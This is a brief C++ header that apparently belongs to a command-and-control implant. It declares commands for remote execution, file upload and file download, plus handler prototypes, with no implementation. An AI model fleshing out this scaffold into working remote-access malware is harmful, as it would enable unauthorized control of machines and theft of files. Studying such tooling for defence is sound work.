#ifndef C2_H
#define C2_H

#include "NETWORKING.h"

// Enum for C2 commands
enum class C2Command { EXECUTE, UPLOAD, DOWNLOAD, EXIT };

// Structure for C2 commands
struct C2CommandMessage {
    C2Command command;
    char* args;
    int argsSize;
};

// Function prototypes
void handleC2Command(C2CommandMessage message);
void sendC2Response(C2Message response);
void executeCommand(char* command);
void uploadFile(char* filePath);
void downloadFile(char* filePath);

#endif // C2_H